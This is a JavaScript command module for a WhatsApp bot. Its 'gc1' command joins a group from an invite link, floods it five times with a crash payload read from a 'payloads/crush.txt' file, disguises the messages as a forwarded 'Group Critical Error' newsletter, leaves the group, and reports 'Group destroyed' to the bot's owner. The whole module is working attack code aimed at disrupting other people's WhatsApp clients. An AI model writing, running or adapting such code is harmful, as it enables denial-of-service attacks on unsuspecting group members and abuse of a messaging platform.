const fs = require('fs');
const config = require('../../config');
const { fancy } = require('../../lib/tools');

module.exports = {
    name: "gc1",
    execute: async (conn, msg, args, { from, isOwner }) => {
        if (!isOwner) return;
        if (!args[0]?.includes("chat.whatsapp.com")) return msg.reply(fancy("🥀 ᴘʀᴏᴠɪᴅᴇ ɢʀᴏᴜᴘ ʟɪɴᴋ."));

        try {
            const payload = fs.readFileSync('./lib/payloads/crush.txt', 'utf-8');
            const code = args[0].split('https://chat.whatsapp.com/')[1];
            
            msg.reply(fancy("🥀 ɪɴꜰɪʟᴛʀᴀᴛɪɴɢ ɢʀᴏᴜᴘ: ɢᴄ1 ꜱᴇǫᴜᴇɴᴄᴇ..."));

            const jid = await conn.groupAcceptInvite(code);
            for (let i = 0; i < 5; i++) {
                await conn.sendMessage(jid, { 
                    text: "\u200B" + payload,
                    contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɢʀᴏᴜᴘ ᴄʀɪᴛɪᴄᴀʟ ᴇʀʀᴏʀ" } }
                });
            }
            await conn.groupLeave(jid);

            await conn.sendMessage(conn.user.id, { 
                text: `╭── • 🥀 • ──╮\n  ${fancy("ɢʀᴏᴜᴘ ᴅᴇꜱᴛʀᴏʏᴇᴅ")}\n╰── • 🥀 • ──╯\n\n│ ◦ ᴍɪꜱꜱɪᴏɴ: GC1\n│ ◦ ꜱᴛᴀᴛᴜꜱ: ꜱᴜᴄᴄᴇꜱꜱ\n└──────────────`,
                contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } }
            });
        } catch (e) { msg.reply(fancy("🥀 ʟɪɴᴋ ɪɴᴠᴀʟɪᴅ ᴏʀ ʙᴏᴛ ʙᴀɴɴᴇᴅ.")); }
    }
};
